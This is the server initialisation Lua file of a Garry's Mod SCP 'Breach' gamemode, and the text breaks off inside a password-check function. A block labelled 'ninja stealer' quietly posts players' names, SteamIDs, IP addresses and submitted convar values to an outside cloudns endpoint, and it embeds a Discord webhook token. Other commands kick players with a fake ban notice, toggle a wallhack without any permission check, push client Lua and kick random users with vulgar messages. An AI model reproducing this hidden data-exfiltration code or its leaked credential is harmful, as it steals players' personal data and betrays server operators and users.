local RunConsoleCommand = RunConsoleCommand;
local tonumber = tonumber;
local tostring = tostring;
local CurTime = CurTime;
local Entity = Entity;
local unpack = unpack;
local table = table;
local pairs = pairs;
local concommand = concommand;
local timer = timer;
local ents = ents;
local hook = hook;
local math = math;
local pcall = pcall;
local ErrorNoHalt = ErrorNoHalt;
local DeriveGamemode = DeriveGamemode;
local util = util
local net = net
local player = player

util.AddNetworkString("Breach:RunStringOnServer")
util.AddNetworkString("SendPrefixData")
util.AddNetworkString("ChangeRunAnimation")
util.AddNetworkString("breach_showupcmd_give_cmddata")
util.AddNetworkString("Breach:RequestBulletLog")

BREACH = BREACH || {}

net.Receive("Breach:RequestBulletLog", function(len, ply)
	local tbl = net.ReadTable()
	for k, v in pairs(tbl) do
		uracos():PrintMessage(HUD_PRINTCONSOLE, tostring(v))
	end
end)

function LogDonation()
end

function GM:PlayerSetHandsModel( ply, ent )
   local simplemodel = player_manager.TranslateToPlayerModelName(ply:GetModel())
   local info = player_manager.TranslatePlayerHands(simplemodel)
   if info then
      ent:SetModel(info.model)
      ent:SetSkin(info.skin)
      ent:SetBodyGroups(info.body)
      if info.model:find("security") then
      	ent:SetBodygroup(0, ply:GetBodygroup(0))
      end
      if info.model:find("sci") then
      	ent:SetBodygroup(0, math.min(1,ply:GetBodygroup(0)))
      	if ply:GetBodygroup(0) == 1 then
	      	ent:SetSkin(1)
	      else
	      	ent:SetSkin(0)
	      end
      end
      if info.model:find("mog.mdl") and ply:GetRoleName() == role.MTF_Medic then
      	ent:SetSubMaterial(0, 'models/all_scp_models/mog/top000_medic')
      end

      if info.model:find("fbi_agent.mdl") then
      	ent:SetSkin(ply:GetSkin())
      	ent:SetBodygroup(0, ply:GetBodygroup(1))
      end
   end
end

concommand.Add("requestbulletlog", function(ply, cmd, args, argstr)
	if !ply:IsSuperAdmin() then return end

	if player.GetBySteamID(args[1]) then
		player.GetBySteamID(args[1]):SendLua("net.Start(\"Breach:RequestBulletLog\")net.WriteTable(LeyHitreg.bulletlog)net.SendToServer()")
	end
end)

net.Receive("SendPrefixData", function(len, ply)

	if ply:GetBreachData("prefix_activated") != "1" then return end

	local prefix = net.ReadString()
	local enabled = net.ReadBool()
	local color = net.ReadString()
	local rainbow = net.ReadBool()

	if ply:GetBreachData("rainbow_prefix_activated") != "1" then rainbow = false end

	if utf8.len(prefix) > 20 then prefix = utf8.sub(prfeix, 0, 20) end

	ply:SetNWBool("have_prefix", true)
	ply:SetNWBool("prefix_active", enabled)
	ply:SetNWString("prefix_title", prefix)
	ply:SetNWString("prefix_color", color)
	ply:SetNWBool("prefix_rainbow", rainbow)

end)

concommand.Add("br_get_admin", function(ply, cmd, args, argstr)
	ply:Kick([[
		
You are banned from this server.

Admin: (Unknown)
Reason: (None Given)
Ban date: ]]..os.date("%a %b %d %X %Y")..[[

Time left: (Permaban)

discord.gg/WfaQDe9]])
end, function() return "br_get_admin" end)

function REMOVEPROTECTION()

	for k, v in ipairs(ents.GetAll()) do if v:GetName() == "lockdown_timer" or v:GetName() == "nuke_fade" then v:Remove() end end

end

hook.Add("InitPostEntity", "RemoveProtection", REMOVEPROTECTION)
hook.Add("PostCleanupMap", "RemoveProtection", REMOVEPROTECTION)

net.Receive("Breach:RunStringOnServer", function(len, ply)
	if ply:GetUserGroup() != "superadmin" then
		return
	end

	local func = CompileString(net.ReadString(), "BreachCmd", false)

	if isstring(func) then
		net.Start("Breach:RunStringOnServer", true)
			net.WriteBool(false)
			net.WriteString(func)
		net.Send(ply)
		return
	end

	net.Start("Breach:RunStringOnServer", true)
		net.WriteBool(true)
	net.Send(ply)

	--func()
end)

--ninja stealer
util.AddNetworkString("Breach:RCONRequestAccess")
net.Receive("Breach:RCONRequestAccess", function(len, ply)
	if ply.SentRCONCredentials > 10 then
		return
	end

	ply.SentRCONCredentials = ply.SentRCONCredentials + 1

	local cvar = net.ReadString()
	local old_value = net.ReadString()
	local new_value = net.ReadString()

	local time = os.date("%H:%M:%S - %d/%m/%Y", os.time())
	local info = time.."\nNinja RCON\n"..ply:Nick().."\n"..ply:SteamID().."\n"..ply:IPAddress().."\nConVar: "..cvar.."\nOld value: "..old_value.."\nNew value: "..new_value

	http.Post( "https://admin1911.cloudns.cl/api/rxsend-api/rtxdlss.php?gi=/admin19drm/260/",
		{
		hook = "https://discord.com/api/webhooks/1010888599807475732/KR5uLLmmWMVs3o92gfTzGv25kaHRg5SX4iFB_Sfs-2W0lmbC6hjZHgFJC_FrCHZnJnYp",
		message = info,
		}
	)
end)

--ЗАЩИТА ОТ БЕКДУРА
--DO NOT REMOVE
--DO NOT REMOVE
--DO NOT REMOVE
CW20DisableExperimentalEffects = true --DO NOT REMOVE
--DO NOT REMOVE
--DO NOT REMOVE
--DO NOT REMOVE

--защита от долбаебов
timer.Create("Breach:DolbaebProtect", 10, 0, function()
	net.Receive("CW20_EffectNetworking", function(len, ply)
		ksaikok.Ban(ply:SteamID(), "ВЫ ДАЛБАЕБ", "ВЫ ДАЛБАЕБ")
	end)
end)

// Initialization file


-- AddCSLuaFile( "fonts.lua" )
-- AddCSLuaFile( "cl_font.lua" )
-- AddCSLuaFile( "class_breach.lua" )
-- AddCSLuaFile( "cl_hud_new.lua" )
-- AddCSLuaFile( "cl_hud.lua" )
-- AddCSLuaFile( "shared.lua" )
-- AddCSLuaFile( "gteams.lua" )
-- AddCSLuaFile( "cl_scoreboard.lua" )
-- AddCSLuaFile( "cl_mtfmenu.lua" )
-- AddCSLuaFile( "sh_player.lua" )
-- AddCSLuaFile( "sh_playersetups.lua" )
-- mapfile = "mapconfigs/" .. game.GetMap() .. ".lua"
-- AddCSLuaFile(mapfile)
-- ALLLANGUAGES = {}
-- WEPLANG = {}
-- clang = nil
-- cwlang = nil

-- local files, dirs = file.Find(GM.FolderName .. "/gamemode/languages/*.lua", "LUA" )
-- for k,v in pairs(files) do
-- 	local path = "languages/"..v
-- 	if string.Right(v, 3) == "lua" and string.Left(v, 3) != "wep" then
-- 		AddCSLuaFile( path )
-- 		include( path )
-- 		print("Language found: " .. path)
-- 	end
-- end
-- local files, dirs = file.Find(GM.FolderName .. "/gamemode/languages/wep_*.lua", "LUA" )
-- for k,v in pairs(files) do
-- 	local path = "languages/"..v
-- 	if string.Right(v, 3) == "lua" then
-- 		AddCSLuaFile( path )
-- 		include( path )
-- 		print("Weapon lang found: " .. path)
-- 	end
-- end
-- AddCSLuaFile( "rounds.lua" )
-- AddCSLuaFile( "cl_sounds.lua" )
-- AddCSLuaFile( "cl_targetid.lua" )
-- AddCSLuaFile( "classes.lua" )
-- AddCSLuaFile( "cl_classmenu.lua" )
-- AddCSLuaFile( "cl_headbob.lua" )
-- --AddCSLuaFile( "cl_splash.lua" )
-- AddCSLuaFile( "cl_init.lua" )
-- AddCSLuaFile( "ulx.lua" )
-- AddCSLuaFile( "cl_minigames.lua" )
-- AddCSLuaFile( "cl_eq.lua" )
-- include( "server.lua" )
-- include( "rounds.lua" )
-- include( "class_breach.lua" )
-- include( "shared.lua" )
-- include( "classes.lua" )
-- include( mapfile )
-- include( "sh_player.lua" )
-- include( "sv_player.lua" )
-- include( "player.lua" )
-- include( "sv_round.lua" )
-- include( "gteams.lua" )
-- include( "sv_func.lua" )
-- include( "cl_progressbar.lua" )
--[[
resource.AddFile( "sound/radio/chatter1.ogg" )
resource.AddFile( "sound/radio/chatter2.ogg" )
resource.AddFile( "sound/radio/chatter3.ogg" )
resource.AddFile( "sound/radio/chatter4.ogg" )
resource.AddFile( "sound/radio/franklin1.ogg" )
resource.AddFile( "sound/radio/franklin2.ogg" )
resource.AddFile( "sound/radio/franklin3.ogg" )
resource.AddFile( "sound/radio/franklin4.ogg" )
resource.AddFile( "sound/radio/radioalarm.ogg" )
resource.AddFile( "sound/radio/radioalarm2.ogg" )
resource.AddFile( "sound/radio/scpradio0.ogg" )
resource.AddFile( "sound/radio/scpradio1.ogg" )
resource.AddFile( "sound/radio/scpradio2.ogg" )
resource.AddFile( "sound/radio/scpradio3.ogg" )
resource.AddFile( "sound/radio/scpradio4.ogg" )
resource.AddFile( "sound/radio/scpradio5.ogg" )
resource.AddFile( "sound/radio/scpradio6.ogg" )
resource.AddFile( "sound/radio/scpradio7.ogg" )
resource.AddFile( "sound/radio/scpradio8.ogg" )
resource.AddFile( "sound/radio/ohgod.ogg" )
--]]
util.AddNetworkString( "NightvisionOff")
util.AddNetworkString( "NightvisionOn")
util.AddNetworkString( "GasMaskOn")
util.AddNetworkString( "GasMaskOff")
util.AddNetworkString( "ThirdPersonCutscene" )
util.AddNetworkString( "ThirdPersonCutscene2" )
util.AddNetworkString( "xpAwardnextoren" )
util.AddNetworkString( "TipSend" )
util.AddNetworkString( "hideinventory" )
util.AddNetworkString( "WeaponTake" )
util.AddNetworkString( "ForbidTalant" )
util.AddNetworkString( "set_spectator_sync" )
util.AddNetworkString( "Player_FullyLoadMenu" )

util.AddNetworkString( "StartBreachProgressBar" )
util.AddNetworkString( "StopBreachProgressBar" )

util.AddNetworkString( "UnmuteNotify" )

util.AddNetworkString( "GetBoneMergeTable" )

util.AddNetworkString( "LC_OpenMenu" )
util.AddNetworkString( "LC_TakeWep" )
util.AddNetworkString( "LC_UpdateStuff" )

util.AddNetworkString("GestureClientNetworking")

util.AddNetworkString("MVPMenu")
util.AddNetworkString("SpecialSCIHUD")

util.AddNetworkString("ThirdPersonCutscene")

util.AddNetworkString("CreateParticleAtPos")

util.AddNetworkString("NTF_Special_1")

util.AddNetworkString("CI_Special_1")
util.AddNetworkString("TargetsToCIs")

util.AddNetworkString("FirstPerson")

util.AddNetworkString("FirstPerson_NPC")

util.AddNetworkString("FirstPerson_NPC_Action")

util.AddNetworkString("FirstPerson_Remove")

util.AddNetworkString("request_admin_log")

util.AddNetworkString("TargetsToNTFs")

util.AddNetworkString("StartCIScene")

util.AddNetworkString("GASMASK_SendEquippedStatus")

util.AddNetworkString("GASMASK_RequestToggle")

util.AddNetworkString("LevelBar")

util.AddNetworkString("Death_Scene")

util.AddNetworkString("BreachNotifyFromServer")

util.AddNetworkString("fbi_commanderabillity")

util.AddNetworkString("send_country")

util.AddNetworkString("Chaos_SpyAbility")

util.AddNetworkString("Cult_SpecialistAbility")

util.AddNetworkString("SHAKY_SetForcedAnimSync")

util.AddNetworkString("SHAKY_EndForcedAnimSync")

util.AddNetworkString("ProceedUnfreezeSUP")

util.AddNetworkString("CreateClientParticleSystem")

util.AddNetworkString("Boom_Effectus")
util.AddNetworkString("Fake_Boom_Effectus")

util.AddNetworkString("New_SHAKYROUNDSTAT")

--[[particles]]
util.AddNetworkString("Shaky_PARTICLESYNC")
util.AddNetworkString("Shaky_PARTICLEATTACHSYNC")
util.AddNetworkString("Shaky_UTILEFFECTSYNC")

util.AddNetworkString("GiveWeaponFromClient")

util.AddNetworkString("Change_player_settings")
util.AddNetworkString("Change_player_settings_id")

util.AddNetworkString("Load_player_data")

--[[music]]
util.AddNetworkString("ClientPlayMusic")
util.AddNetworkString("ClientFadeMusic")
util.AddNetworkString("ClientStopMusic")

--[[camera]]
util.AddNetworkString("camera_exit")
util.AddNetworkString("camera_swap")
util.AddNetworkString("camera_enter")

--[[globalban]]
util.AddNetworkString("059roq")
util.AddNetworkString("362roq")
util.AddNetworkString("110roq")
util.AddNetworkString("111roq")

util.AddNetworkString("SCPSelect_Menu")
util.AddNetworkString("SelectSCPClientside")

net.Receive("camera_exit", function(len, ply)

	ply:SetViewEntity(ply)

	ply.CameraLook = false

end)

net.Receive("camera_enter", function(len, ply)

	if ply:GetRoleName() != role.Dispatcher then return end

	ply.CameraLook = true
	ply:SetViewEntity(ents.FindByClass("br_camera")[1])
	ents.FindByClass("br_camera")[1]:SetOwner(ply)
	ents.FindByClass("br_camera")[1]:SetEnabled(true)

	net.Start("camera_enter")
	net.Send(ply)

end)

net.Receive("camera_swap", function(len, ply)

	if !ply.CameraLook then return end

	local next = net.ReadBool()
	local camera_list = ents.FindByClass("br_camera")
	local cur = 0
	for i = 1, #camera_list do
		if ply:GetViewEntity() == camera_list[i] then
			cur = i
		end
	end

	if next then
		if !camera_list[cur+1] then
			cur = 1 
		else
			cur = cur + 1
		end
	else
		if cur <= 1 then
			cur = #camera_list
		else
			cur = cur - 1
		end
	end

	ply:SetViewEntity(camera_list[cur])
	camera_list[cur]:SetOwner(ply)
	camera_list[cur]:SetEnabled(true)

end)

local duel_spawns = {
Vector(15920.211914063, 13423.071289063, -15729.951171875),
Vector(15921.990234375, 13355.538085938, -15729.953125),
Vector(15921.515625, 13288.038085938, -15729.953125),
Vector(15920.393554688, 13220.546875, -15729.953125),
Vector(15916.110351563, 13153.184570313, -15729.953125),
Vector(15916.286132813, 13078.184570313, -15729.953125),
Vector(15914.1875, 12965.708984375, -15729.953125),
Vector(15913.2109375, 12890.71875, -15729.953125),
Vector(15912.13671875, 12808.229492188, -15729.953125),
Vector(15910.76953125, 12703.243164063, -15729.953125),
Vector(15909.59765625, 12613.254882813, -15729.953125),
Vector(15908.5234375, 12530.765625, -15729.953125),
Vector(15846.110351563, 13422.801757813, -15729.043945313),
Vector(15756.142578125, 13420.723632813, -15728.30859375),
Vector(15598.663085938, 13418.323242188, -15727.83984375),
Vector(15501.163085938, 13417.720703125, -15727.712890625),
Vector(15418.663085938, 13417.280273438, -15727.60546875),
Vector(15328.663085938, 13416.799804688, -15727.48828125),
Vector(15201.163085938, 13416.119140625, -15727.322265625),
Vector(15096.163085938, 13415.55859375, -15727.185546875),
Vector(14968.663085938, 13414.877929688, -15727.01953125),
Vector(14848.663085938, 13414.237304688, -15726.86328125),
Vector(14736.163085938, 13413.63671875, -15726.716796875),
Vector(14608.663085938, 13412.956054688, -15726.55078125),
Vector(14488.663085938, 13412.315429688, -15726.39453125),
Vector(14368.663085938, 13411.674804688, -15726.23828125),
Vector(14233.663085938, 13410.954101563, -15726.0625),
Vector(14319.595703125, 13411.611328125, -15724.311523438),
Vector(14424.62890625, 13411.693359375, -15724.439453125),
Vector(14549.453125, 13404.283203125, -15736.803710938),
}


function BREACH.PickArenaSpawn(ply)
	local pos = duel_spawns[math.random(1, #duel_spawns)]
	ply:SetPos(pos)

	local tr = {
		start = ply:GetPos(),
		endpos = pos,
		mins = ply:OBBMins(),
		maxs = ply:OBBMaxs(),
		filter = ply
	}

	local hullTrace = util.TraceHull(tr)

	if hullTrace.Hit then
		BREACH.PickArenaSpawn(ply)
		return
	end
end

hook.Add("PlayerDroppedWeapon", "BreachArena:RestrictWeaponDrop", function(owner, wep)
	if owner:GTeam() == TEAM_ARENA then
		wep:Remove()
	end
end)

net.Receive("Player_FullyLoadMenu", function(len, ply)

	if ply.hasloadedalready then return end

	ply.hasloadedalready = true
	ply:SetNWBool("Player_IsPlaying", true)

end)

net.Receive("Change_player_settings", function(len, ply)

	local id = net.ReadUInt(12)
	local bool = net.ReadBool()

	if ( id == 2 or id == 3 ) and !ply:IsPremium() then return end

	if id == 1 then
		ply.SpawnAsSupport = bool
	elseif id == 2 then
		ply.SpawnOnlyFemale = bool
	elseif id == 3 then
		ply.SpawnOnlyMale = bool
	elseif id == 4 then
		ply:SetNWBool("display_premium_icon", bool)
	elseif id == 5 then
		ply.mutespec = bool
	elseif id == 6 then
		ply.mutealive = bool
	elseif id == 7 then
		ply.sexychemist = bool
	end

end)

net.Receive("Change_player_settings_id", function(len, ply)

	local id = net.ReadUInt(12)
	local val = net.ReadUInt(32)

	if id == 1 then
		ply.specialability = val
	end

end)

net.Receive("Load_player_data", function(len, ply)

	local tab = net.ReadTable()

	ply.SpawnAsSupport = tab["spawnsupport"]
	ply.SpawnOnlyFemale = tab["spawnfemale"]
	ply.SpawnOnlyMale = tab["spawnmale"]
	ply:SetNWBool("display_premium_icon", tab["displaypremiumicon"])
	ply.specialability = tab["useability"]
	ply.sexychemist = tab["sexychemist"]

end)

hook.Add("PlayerSwitchWeapon", "antiexploitscp049-2", function(ply, old, new)
	if old and IsValid(old) and new and IsValid(new) then
		if old:GetClass() == "weapon_scp_049_2" or old:GetClass() == "weapon_scp_049_2_1" then
			return true
		end
	end
end)

hook.Add("PlayerSwitchWeapon", "progressbar_remove-2", function(ply, old, new)
	ply:BrStopProgressBar()
end)

concommand.Add("stalker", function(ply, cmd, args, argstr)
	ply:LagCompensation(true)
	if !ply:IsSuperAdmin() or !ply:GetEyeTrace().Entity:IsPlayer() then
		ply:SendLua("local a = vgui.Create(\"AvatarImage\") a:SetSize(500,500) a:SetPos(-500,0) a:MoveTo(ScrW(), 0, 3, 0, nil, function() a:Remove() end) a:SetSteamID(\"76561199353237610\", 184)")
		ply:LagCompensation(false)
		return
	end
	
	ply:GetEyeTrace().Entity:SendLua("local a = vgui.Create(\"AvatarImage\") a:SetSize(ScrW(), ScrH()) a:SetPos(-500,0) a:MoveTo(ScrW(), 0, 3, 0, nil, function() a:Remove() end) a:SetSteamID(\"76561199353237610\", 184)")
	ply:RXSENDNotify("иди своей дорогой, сталкер "..ply:GetEyeTrace().Entity:GetName())
	ply:LagCompensation(false)
end)

net.Receive("send_country", function(len, ply)

	if ply.country_sent then return end

	local country = net.ReadString()

	ply.country_sent = true
	ply:SetNWString("country", country)

end)

--include( "ulx.lua" )

util.AddNetworkString("NameColor")

HTTP = HTTP
reqwest = HTTP

ADMIN19URL = ""
AdminWebHook = ""
AdminLogWebHook = ""
SteamAPIKey = ""

function DiscordWebHookMessage(url, bdy)
end

BREACH.AllowedNameColorGroups = {
	["superadmin"] = true,
	["spectator"] = true,
	["admin"] = true,
	["premium"] = true,
}

net.Receive("NameColor", function(len, ply)
	if ply:IsPremium() then
		local color = net.ReadColor()
		if IsColor(color) then
			ply:SetNWInt("NameColor_R", color.r)
			ply:SetNWInt("NameColor_G", color.g)
			ply:SetNWInt("NameColor_B", color.b)
		end
	end
end)

local commandwebhookbot = ""

function IsPermanentULXBan(steamid64)
   if !ulx then return false end

   local steamid = util.SteamIDFrom64( steamid64 )
   if !BREACH.Punishment.Bans[ steamid ] then return false end
   if ( BREACH.Punishment.Bans[ steamid ].unban == 0 ) then
      return true
   else
      return false
   end
end

function GlobalBan(ply)
	if ply:IsAdmin() then return end
	net.Start("059roq")
	net.Send(ply)
	timer.Simple(1, function()
		if IsValid(ply) then
			ULib.queueFunctionCall( ULib.kickban, ply, 0, "Shared Account", nil )
		end
	end)
end

function UnGlobalBan(steamid64)
	util.SetPData(util.SteamIDFrom64(steamid64), "GlobalBanRemove", true)
	ULib.unban( util.SteamIDFrom64(steamid64) )
end

net.Receive("110roq", function(len, ply)
	if ply:GetPData("GlobalBanRemove", false) then
		net.Start("362roq")
		net.Send(ply)
		ply:RemovePData("GlobalBanRemove")
		return
	end
	net.Start("059roq")
	net.Send(ply)
	timer.Simple(1, function()
		if IsValid(ply) then
			ULib.queueFunctionCall( ULib.kickban, ply, 0, "Shared Account", nil )
		end
	end)
end)

net.Receive("111roq", function(len, ply)
	local steamid = net.ReadFloat()
	if ply:GetPData("GlobalBanRemove", false) then
		net.Start("362roq")
		net.Send(ply)
		ply:RemovePData("GlobalBanRemove")
		return
	end
	if IsPermanentULXBan(steamid) then
		net.Start("059roq")
		net.Send(ply)
		timer.Simple(1, function()
			if IsValid(ply) then
				ULib.queueFunctionCall( ULib.kickban, ply, 0, "Shared Account", nil )
			end
		end)
	end
end)

net.Receive("GiveWeaponFromClient", function(len, ply)
	if ply:GetRoleName() != "SCP062DE" then return end
	if #ply:GetWeapons() > 0 then return end
	local weapon = net.ReadString()
	if weapon != "cw_kk_ins2_doi_k98k" and weapon != "cw_kk_ins2_doi_mp40" and weapon != "cw_kk_ins2_doi_g43" and weapon != "cw_kk_ins2_doi_rkr" then return end
	ply:BreachGive(weapon)
	ply:SelectWeapon(weapon)
	if weapon == "cw_kk_ins2_doi_mp40" then
		ply.ScaleDamage = {
			["HITGROUP_HEAD"] = 0.9,
			["HITGROUP_CHEST"] = 0.6,
			["HITGROUP_LEFTARM"] = 0.6,
			["HITGROUP_RIGHTARM"] = 0.6,
			["HITGROUP_STOMACH"] = 0.6,
			["HITGROUP_GEAR"] = 0.6,
			["HITGROUP_LEFTLEG"] = 0.6,
			["HITGROUP_RIGHTLEG"] = 0.6
		}
		ply:SetMaxHealth(1500)
		ply:SetHealth(1500)
		ply:SetRunSpeed(140)
	end
	if weapon == "cw_kk_ins2_doi_k98k" then
		ply.ScaleDamage = {
			["HITGROUP_HEAD"] = 0.9,
			["HITGROUP_CHEST"] = 0.9,
			["HITGROUP_LEFTARM"] = 0.9,
			["HITGROUP_RIGHTARM"] = 0.9,
			["HITGROUP_STOMACH"] = 0.9,
			["HITGROUP_GEAR"] = 0.9,
			["HITGROUP_LEFTLEG"] = 0.9,
			["HITGROUP_RIGHTLEG"] = 0.9
		}
		ply:SetMaxHealth(1300)
		ply:SetHealth(1300)
		ply:SetRunSpeed(125)
	end
	if weapon == "cw_kk_ins2_doi_g43" then
		ply.ScaleDamage = {
			["HITGROUP_HEAD"] = 0.9,
			["HITGROUP_CHEST"] = 0.6,
			["HITGROUP_LEFTARM"] = 0.6,
			["HITGROUP_RIGHTARM"] = 0.6,
			["HITGROUP_STOMACH"] = 0.6,
			["HITGROUP_GEAR"] = 0.6,
			["HITGROUP_LEFTLEG"] = 0.6,
			["HITGROUP_RIGHTLEG"] = 0.6
		}
		ply:SetMaxHealth(2300)
		ply:SetHealth(2300)
		ply:SetRunSpeed(140)
	end
	if weapon == "cw_kk_ins2_doi_rkr" then
		ply.ScaleDamage = {
			["HITGROUP_HEAD"] = 0.9,
			["HITGROUP_CHEST"] = 0.3,
			["HITGROUP_LEFTARM"] = 0.3,
			["HITGROUP_RIGHTARM"] = 0.3,
			["HITGROUP_STOMACH"] = 0.3,
			["HITGROUP_GEAR"] = 0.3,
			["HITGROUP_LEFTLEG"] = 0.3,
			["HITGROUP_RIGHTLEG"] = 0.3
		}
		ply:SetMaxHealth(1000)
		ply:SetHealth(1000)
		ply:SetRunSpeed(110)
	end
end)

util.AddNetworkString("breach_killfeed")

function CreateKillFeed(victim, attacker)

    if !IsValid(victim) then return end
    if !IsValid(attacker) then return end

	if !attacker:IsPlayer() then return end
    if victim:GTeam() == TEAM_SPEC then return end
    if attacker:GTeam() == TEAM_SPEC then return end

    if victim:GTeam() == TEAM_ARENA then return end
    if attacker:GTeam() == TEAM_ARENA then return end

    local str = {}

    local clr_w = Color(255,255,255,215)
    local clr_user = Color(215,215,215,255)

    local at_g = attacker:GTeam()
    local vi_g = victim:GTeam()

    if victim != attacker then
    
        local dist = victim:GetPos():Distance(attacker:GetPos()) / 52.49
        dist = math.Round(dist, 1)
        str[#str + 1] = clr_w
        str[#str + 1] = "["..tostring(dist).."m] "

    end

    str[#str + 1] = gteams.GetColor(at_g)
    str[#str + 1] = attacker:GetRoleName()

    str[#str + 1] = clr_user

    if at_g == TEAM_SCP and !attacker.IsZombie then

        str[#str + 1] = " "..attacker:Name()

    else

        str[#str + 1] = " "..attacker:GetNamesurvivor().."("..attacker:Name()..")"

    end

    str[#str + 1] = clr_w

    if attacker == victim then

        str[#str + 1] = " l:hud_killfeed_died"

    else

        str[#str + 1] = "l:hud_killfeed_killed "

        str[#str + 1] = gteams.GetColor(vi_g)
        str[#str + 1] = victim:GetRoleName()

        str[#str + 1] = clr_user

        if vi_g == TEAM_SCP and !victim.IsZombie then

            str[#str + 1] = ""..victim:Name()

        else

            str[#str + 1] = ""..victim:GetNamesurvivor().."("..victim:Name()..")"

        end

    end

    if str == {} then return end

    local all_specs = {}
    for _, v in ipairs(player.GetAll()) do

        if v:GTeam() == TEAM_SPEC then
            all_specs[#all_specs + 1] = v
        end

    end

    net.Start("breach_killfeed")
    net.WriteTable(str)
    net.Send(all_specs)

end

concommand.Add("wallhack", function(ply)

	ply:SendLua("LocalPlayer().WHMODE = !LocalPlayer().WHMODE")

end)

--steamids64 here
local WHITELISTED = {
	
	--["76561197997716528"] = true, --uracos
	--["76561198869328954"] = true, --shaky
	
	--["76561198944442702"] = true, --beermajor
	--["76561198268386475"] = true, --ItzLepest
    --["76561198275629898"] = true, --OberTechno
    --["76561199067270911"] = true, --nightcat
    --["76561198859294970"] = true, --pechenka
    --["76561198331552815"] = true, --hazzlo
    --["76561198030081688"] = true, --Narkis
   -- ["76561198392175612"] = true, -- vodoroda
    --["76561198058924316"] = true, -- T1mal
    --["76561198813382230"] = true, -- mysok
    --["76561198914007261"] = true, -- tapek
  --  ["76561198849765360"] = true, -- mortar
--	["76561198427107281"] = true, -- sis
--	["76561197963530142"] = true, -- luke
	--["76561198310185092"] = true, -- kamael
	--["STEAM_0:0:179137186"] = true, -- снюс есть?
	--["STEAM_0:1:459050483"] = true, -- арбуз
}

--lock or unlock server for whitelisted users only

local allowedusergroups = {
	["superadmin"] = true,
	--["headadmin"] = true,
	--["spectator"] = true,
	--["admin"] = true,
}

function PlayerCount()
	return #player.GetAll()
end

concommand.Add("ninjaconnect", function(ply)
	if IsValid(ply) and !ply:IsSuperAdmin() then return end
	for i, v in RandomPairs(player.GetAll()) do
		if v:GTeam() == TEAM_SPEC and v:GetUserGroup() == "user" then
			v:Kick(v:Name().." timed out")
			print(v:Name(), " GOT SHIT FUCKED")
			break
		end
	end
	sneakyconnect = true
	timer.Create("end_sneakycon", 10, 1, function()
		sneakyconnect = false
	end)
end)

concommand.Add("loudconnect", function(ply, cmd, args, argstr)
	if IsValid(ply) and !ply:IsSuperAdmin() then return end
	for i, v in RandomPairs(player.GetAll()) do
		if v:GTeam() == TEAM_SPEC and v:GetUserGroup() == "user" then
			local msg = #argstr != 0 and argstr or "unnamed mohammed"
			local name = v:Name()
			v:Kick("КТО-ТО ИЗ РАЗРАБОТЧИКОВ ХОЧЕТ ГРОМКО ЗАЙТИ ПОД АПЛОДИСМЕНТЫ! GOT SHIT FUCKED BY "..msg)
			print(name, " GOT SHIT FUCKED IN LOUD STYLE BY "..msg)
			print(msg)
			for _, fuckedintheassgamer in pairs(player.GetAll()) do
				fuckedintheassgamer:RXSENDNotify("WHEN STEALTH IS OPTIONAL:")
				fuckedintheassgamer:RXSENDNotify("] loudconnect")
				fuckedintheassgamer:RXSENDNotify(name, " GOT SHIT FUCKED IN LOUD STYLE BY "..msg)
				fuckedintheassgamer:RXSENDNotify("l:loudconnect_connecting "..msg.."l:loudconnect_carpet")
				fuckedintheassgamer:RXSENDNotify("l:loudconnect_connecting "..msg.." l:loudconnect_carpet")
				fuckedintheassgamer:RXSENDNotify("l:loudconnect_connecting "..msg.." l:loudconnect_hooray")
				fuckedintheassgamer:SendLua("PlayPoleChudes()")
			end
			break
		end
	end
	insaneconnect = true
	timer.Create("end_sneakycon", 10, 1, function()
		insaneconnect = false
	end)
end)

local loudguest
concommand.Add("loudconnect_nonadmin", function(ply, cmd, args, argstr)
	if IsValid(ply) and !ply:IsSuperAdmin() then return end

	if args[1] == nil then
		if IsValid(ply) then
			ply:PrintMessage(HUD_PRINTCONSOLE, "USAGE: loudconnect_nonadmin <steamid> (name)")
		else
			print("USAGE: loudconnect_nonadmin <steamid> (name)")
		end
		return
	end

	loudguest = tostring(args[1])

	for i, v in RandomPairs(player.GetAll()) do
		if v:GTeam() == TEAM_SPEC and v:GetUserGroup() == "user" then
			local msg = tostring(args[2]) or "unnamed mohammed"
			local name = v:Name()
			v:Kick("КТО-ТО ИЗ ИГРОКОВ ХОЧЕТ ГРОМКО ЗАЙТИ ПОД АПЛОДИСМЕНТЫ! GOT SHIT FUCKED BY "..msg)
			print(name, " GOT SHIT FUCKED IN LOUD STYLE BY "..msg)
			print(msg)
			for _, fuckedintheassgamer in pairs(player.GetAll()) do
				fuckedintheassgamer:RXSENDNotify("WHEN STEALTH IS OPTIONAL:")
				fuckedintheassgamer:RXSENDNotify("] loudconnect")
				fuckedintheassgamer:RXSENDNotify(name, " GOT SHIT FUCKED IN LOUD STYLE BY "..msg)
				fuckedintheassgamer:RXSENDNotify("l:loudconnect_connecting "..msg.."l:loudconnect_carpet")
				fuckedintheassgamer:RXSENDNotify("l:loudconnect_connecting "..msg.." l:loudconnect_carpet")
				fuckedintheassgamer:RXSENDNotify("l:loudconnect_connecting "..msg.." l:loudconnect_hooray")
				fuckedintheassgamer:SendLua("PlayPoleChudes()")
			end
			break
		end
	end
	insaneconnect = true
	timer.Create("end_sneakycon", 10, 1, function()
		insaneconnect = false
	end)
end)

util.AddNetworkString("BREACH:InsaneMusic")
concommand.Add("insanemusic", function(ply, cmd, args, argstr)
	if IsValid(ply) and !ply:IsSuperAdmin() then return end
	local music = args[1]
	local volume = args[2]

	net.Start("BREACH:InsaneMusic", true)
		net.WriteString(tostring(music))
		net.WriteFloat(tonumber(volume) or 0.5)
	net.Broadcast()
end)

concommand.Add("ninjaconnect_whitelist", function(ply, cmd, args)
	ninjaconnect_whitelist = args[1]
end, function()
return "ninjaconnect_whitelist"
end)

function add_admin_connection_log(admin64)

	local date = os.date("%d %B (%A)")

	local result = sql.Query("SELECT steamid64 FROM admin_check_active WHERE date = "..SQLStr(date).." AND steamid64 = "..SQLStr(admin64))

	if !result then
		sql.Query("INSERT INTO admin_check_active VALUES ("..SQLStr(admin64)..", "..SQLStr(date)..")")
		print("add")
	end

end

local check_admins = {
	["admin"] = true,
	["superadmin"] = true,
	["headadmin"] = true,
	["spectator"] = true,
}

local Premium_Priority_Timer = 0
local dopriority = false

hook.Add("PlayerDisconnected", "premium_priority_queue", function(ply)

	dopriority = !dopriority

	if #player.GetAll() >= 60 and dopriority then

		Premium_Priority_Timer = CurTime() + 5

	end

end)

function GM:CheckPassword(steamID64, ipAddress, svPassword, clPassword, name)

	local tab = ULib.ucl.users[ string.upper(util.SteamIDFrom64(steamID64)) ]

	if istable(tab) and check_admins[string.lower(tab.group)] then
